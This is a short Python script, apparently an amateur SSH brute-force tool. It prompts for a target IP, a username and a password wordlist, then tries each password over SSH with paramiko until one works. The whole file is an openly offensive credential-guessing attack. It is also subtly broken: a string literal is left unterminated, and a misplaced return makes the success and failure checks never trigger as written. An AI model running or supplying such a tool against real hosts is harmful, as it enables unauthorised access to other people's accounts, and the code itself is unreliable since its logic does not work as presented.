import paramiko, sys, os, socket, termcolor
host = input('[+] Target IP Address: ')
username = input('[+] SSH Username: ')
#Identifies list of passwords to try bruteforcing the user ssh with. There are many huge lists of passwords used in IRL attacks.
input_file = input('[+] Passwords file: ')

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        print(termcolor.colored(f'[+] Password Successful: {password}', 'green'))
    except paramiko.AuthenticationException:
        code = 1
        print(termcolor.colored(f'[-] Incorrect Password: {password}', 'red'))
    except socket.error as e:
        code = 2
        print(termcolor.colored(f'[-] Incorrect Password: {password}', 'red'))
        ssh.close()
        return code

if os.path.exists(input_file) == False:
    print('[!!] That file doesn\'t seem to exist.')
    sys.exit(1)

print(f'Starting SSH Bruteforce on {host} with Account: {username} * * *')
with open(input_file, mode='r') as f:
    for line in f.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
               print(termcolor.colored(f'[+] Found Password: {password} For Account: {username}', 'green))
               break
            elif response == 1:
                print(termcolor.colored(f'[-] Incorrect Password {password} For Account: {username}', 'red'))
            elif response == 2:
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
